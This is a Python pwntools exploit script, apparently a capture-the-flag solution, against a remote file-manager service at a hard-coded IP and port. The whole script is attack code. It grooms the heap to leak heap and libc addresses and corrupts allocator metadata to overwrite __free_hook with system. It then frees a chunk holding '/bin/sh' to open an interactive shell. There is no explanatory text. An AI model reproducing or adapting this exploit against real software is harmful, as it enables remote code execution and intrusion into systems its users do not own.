from pwn import *

#p=process('./s')
p=remote('34.85.75.40',31000)

slog = lambda x,y : success(x+':'+hex(y))
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
ru = lambda x : p.recvuntil(x)
rn = lambda x : p.recvn(x)
go = lambda : p.interactive()

def list():
    sla('>','1')

def addF(name,size,data):
    sla('>','2')
    sla('name:',name)
    sla('size:',str(size))
    if size<=0x50:
        p.sendline(data)
    else:
        p.send(data)

def addD(name):
    sla('>','3')
    sla('name:',name)

def showF(name):
    sla('>','4')
    sla('name: ',name)

def cd(name):
    sla('>','5')
    sla('name:',name)

def rm(name):
    sla('>','6')
    sla('name:',name)

#[1]HEAP LEAK
addF('1',0x50,'1'*0x50)
addF('2',0x80,'2'*0x80)
rm('1')
addF('1',0x50,'1'*0x50+'\x012')

dirs=[]
n=3
for i in range(3,6):
    addD(str(n))
    cd(str(n))
    dirs.append(n)
    n+=1
    for j in range(89):
        addF(str(n),0x80,str(n)*4)
        n+=1
        if n==256:
            break
    if n==256:
        break
    cd('..')
cd('..')
cd('2')

list()
ru('1\n')
leak=0
for i in range(6):
    leak+=int(p.recvline()[:-1])<<(i*8)

hb=leak-0x8030-0x250
slog('heapbase',hb)

#[2]LIBC LEAK
cd('..')
addr=hb+69264
rmTarget=[(addr>>(i*8))&0xff for i in range(6)]

cd(str(dirs[2]))
for i in range(247,255):
    rm(str(i))

cd('..')
cd('3')
rm('5')
cd('..')
addD('5')
rm('1')
cd('5')
addF('1',0x10,'1')

cd('..')

for i in range(6):
    for dir in dirs:
        cd(str(dir))
        rm(str(rmTarget[i]))
        cd('..')
    cd('5')
    addF(str(rmTarget[i]),0x50,str(rmTarget[i]))
    cd('..')

cd('3')
rm('4')
cd('..')
addF('4',0x50,'4'*0x50+'\x025')
showF('5')
leak=p.recvline()[:-1]
if len(leak)!=6:
    quit()
lb=u64(leak+'\x00'*2)-0x3ebca0
fh=lb+0x3ed8e8
system=lb+0x4f440
slog('libcBase',lb)

rm('4')
addF('4',0x50,'4'*0x50+'\x015')
cd('5')
rm('1')
cd('..')
addF('1',0x50,'1')

#[3]EXPLOIT
cd(str(dirs[2]))
rm('246')
addF('246',0x60,'246')
rm('246')

addr=hb+0x10e90
rmTarget=[(addr>>(i*8))&0xff for i in range(6)]

cd(str(dirs[2]))

cd('..')
cd('3')
rm('6')
cd('..')
addD('6')
rm('1')
cd('6')
addF('1',0x10,'1')
cd('..')

dirs.append(5)

for i in range(6):
    for dir in dirs:
        cd(str(dir))
        rm(str(rmTarget[i]))
        cd('..')
    cd('6')
    addF(str(rmTarget[i]),0x50,str(rmTarget[i]))
    cd('..')

rm('5')
addF('5',0x50,'5'*0x50+'\x026')
rm('6')

addF('ex',0x60,p64(fh))
addF('ov',0x60,"/bin/sh")
addF('ov',0x60,p64(system))

pause()
rm('ex')

go()
